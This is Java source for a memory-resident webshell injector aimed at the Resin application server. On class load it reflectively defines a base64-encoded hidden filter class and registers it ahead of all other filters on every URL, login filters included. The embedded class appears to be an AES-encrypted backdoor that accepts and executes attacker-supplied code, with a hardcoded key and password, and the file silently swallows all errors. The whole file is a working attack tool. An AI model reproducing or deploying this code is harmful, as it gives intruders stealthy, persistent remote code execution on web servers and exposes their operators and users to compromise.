package core.memshell;

import javax.servlet.Filter;
import javax.servlet.ServletContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

public class ResinFilterMemShell {

    static {
        Inject();
    }

    public ResinFilterMemShell() {
        Inject();
    }


    public static synchronized void Inject() {
        try {
            String filterName = "memshell.ResinFilterShell";
            String urlPattern = "/*";

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");

            Object contextRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
            Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
            Class<?> FilterConfigImplClass = classLoader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
            String FilterBase64 = "yv66vgAAADMBhgoAZwDYCQBSANkJAFIA2ggA2wkAUgDcCADdCQBSAN4IAN8JAFIA4AcA4QoACgDYCgAKAOIKAAoA4woAUgDkCQBSAOUIAOYJAFIA5woAZwDoCgBnAOkIAOoKAOsA7AcA7QoAMQDuCgAWAO8KAOsA8AoA6wDxBwDyCADzCgD0APUKADEA9goA9AD3BwD4CgD0APkKACAA+goAIAD7CgAxAPwIAP0KAC4A/ggA/wcAtAoALgEABwC9CgEBAQIKADABAwgBBAcBBQcAgAcBBgcBBwgBCAoALgEJCAEKCAELCAEMCAENCAEOCgAuAQ8HARAKAC4BEQoAOgESCgA/ARMKAD8BFAcBFQoALgEWBwEXCgBBANgKAEEBGAoAQQEZCgBSARoHARsHARwIAR0LAEYBHggBHwoAMQEgCwBGASELAEYBIgoAUgEjCgBSASQIASULASYBJwcBKAoALgEpCgBSAOgKAFIBKgsBJgErCACzCwBGASsHASwKAFkA2AoAMAEtCwBHAS4KADEBLwoBMAExCgAwAOMKAFkBMgoAUgEzCgAxATQIATUIATYLATcBOAoAGwE5BwE6BwE7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABtMbWVtc2hlbGwvUmVzaW5GaWx0ZXJTaGVsbDsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHASgHATwHAPIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwEHAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjYBAAJicwEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAAW8BAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABWNsYXp6BwEVBwEFBwEQAQANZ2V0RmllbGRWYWx1ZQEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQADb2JqAQAJZmllbGROYW1lBwE9AQAQZ2V0TWV0aG9kQnlDbGFzcwEAUShMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACm1ldGhvZE5hbWUBAApwYXJhbWV0ZXJzAQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAGaW52b2tlAQBLKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQACbzEBAAFpAQABSQEAB2NsYXNzZXMBABVMamF2YS91dGlsL0FycmF5TGlzdDsBAAR2YXI3AQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBFwcBBgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBPgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAARkYXRhAQAEdmFyOQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwE/BwFAAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABVSZXNpbkZpbHRlclNoZWxsLmphdmEMAHMAdAwAaQBqDABrAGwBABAzYzZlMGI4YTljMTUyMjRhDABtAG4BAARwQVMzDABvAG4BABAvZmF2aWNvbmRlbW8uaWNvDABwAG4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBQQFCDAFDAUQMAHEAjgwAcQBuAQAFVVRGLTgMAHIAbgwAcwB6DAFFAUYBAANBRVMHATwMAUcBSAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAUkBSgwAcwFLDADAAUwMAU0BTgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAU8MAUcBUAwBUQFSDAFTAVQBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBVQFKDABzAVYMAUMBVwwBWAFEAQAQamF2YS51dGlsLkJhc2U2NAwBWQFaAQAKZ2V0RW5jb2RlcgwBWwFcBwE9DAC1AV0MAV4BXwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFgAWEBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBYgFjAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFkAV8MAHMBZQwBZgFnDAFoAWkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAwBagFcAQATamF2YS91dGlsL0FycmF5TGlzdAwBawFsDAFtAW4MALAAsQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEFgtUmVxdWVzdGVkLVdpdGgMAW8AjgEADlhNTEhUVFBSZXF1ZXN0DAFwAXEMAXIBcwwBdACODACcAJ0MAIEAggEAEG1lbXNoZWxsLnBheWxvYWQHAT8MAXUBdgEAGW1lbXNoZWxsL1Jlc2luRmlsdGVyU2hlbGwMAXcBeAwAfQB+DAF5AXoBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBewFsDAF8AX0MAX4BfwcBgAwBgQFlDAGCAUoMAJIAkwwBfgFXAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwGDDADFAYQMAYUAdAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAd0b0FycmF5AQAoKFtMamF2YS9sYW5nL09iamVjdDspW0xqYXZhL2xhbmcvT2JqZWN0OwEACWdldEhlYWRlcgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdl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";
            byte[] FilterClass = base64Decode(FilterBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);
            Object filter_class = (Object) filterClass.newInstance();

            Class filterConfigImplCls = classLoader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
            Object filterConfigImpl = filterConfigImplCls.newInstance();

            Method m1 = filterConfigImpl.getClass().getDeclaredMethod("setFilterName", String.class);
            m1.setAccessible(true);
            m1.invoke(filterConfigImpl, filterName);

            Method m2 = filterConfigImpl.getClass().getDeclaredMethod("setFilterClass", String.class);
            m2.setAccessible(true);
            m2.invoke(filterConfigImpl, filterName);

            Method m3=filterConfigImpl.getClass().getDeclaredMethod("setFilter", Filter.class);
            m3.setAccessible(true);
            m3.invoke(filterConfigImpl,filter_class);

            // 4.X getClass | 3.X getClass().getSuperClass
            Method m4 = null;
            try {
                m4 = webapp.getClass().getDeclaredMethod("addFilter", FilterConfigImplClass);
            } catch (Exception e) {
                m4 = webapp.getClass().getSuperclass().getDeclaredMethod("addFilter", FilterConfigImplClass);
            }
            m4.invoke(webapp, filterConfigImpl);

            Class filterMappingCls = classLoader.loadClass("com.caucho.server.dispatch.FilterMapping");
            Object filterMapping = filterMappingCls.newInstance();

            Method m5 = filterMapping.getClass().getDeclaredMethod("createUrlPattern");
            m5.setAccessible(true);
            Object o5 = m5.invoke(filterMapping);

            Method m6 = o5.getClass().getDeclaredMethod("addText", String.class);
            m6.setAccessible(true);
            m6.invoke(o5, urlPattern);

            Method m7 = filterMapping.getClass().getSuperclass().getDeclaredMethod("setFilterName", String.class);
            m7.setAccessible(true);
            m7.invoke(filterMapping, filterName);

            Method m8 = filterMapping.getClass().getSuperclass().getDeclaredMethod("setServletContext", ServletContext.class);
            m8.setAccessible(true);
            m8.invoke(filterMapping, webapp);

            // 4.X getClass | 3.X getClass().getSuperClass
            Field f1 = null;
            try {
                f1 = webapp.getClass().getDeclaredField("_filterMapper");
            } catch (Exception e) {
                f1 = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
            }
            f1.setAccessible(true);
            Object filterMapper = f1.get(webapp);

            Field f2 = filterMapper.getClass().getDeclaredField("_filterMap");
            f2.setAccessible(true);
            ArrayList filterMap = (ArrayList) f2.get(filterMapper);

            filterMap.add(0, filterMapping);

            f1.set(webapp, filterMapper);

            // 4.X getClass | 3.X getClass().getSuperClass
            Field f3 = null;
            try {
                f3 = webapp.getClass().getDeclaredField("_loginFilterMapper");
            } catch (Exception e) {
                f3 = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMapper");
            }
            f3.setAccessible(true);
            Object loginFilterMapper = f3.get(webapp);

            Field f4 = loginFilterMapper.getClass().getDeclaredField("_filterMap");
            f4.setAccessible(true);
            ArrayList filterMap2 = (ArrayList) f4.get(loginFilterMapper);

            filterMap2.add(0, filterMapping);
            f3.set(webapp, loginFilterMapper);

        } catch (Exception e) {
        }

    }
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
}
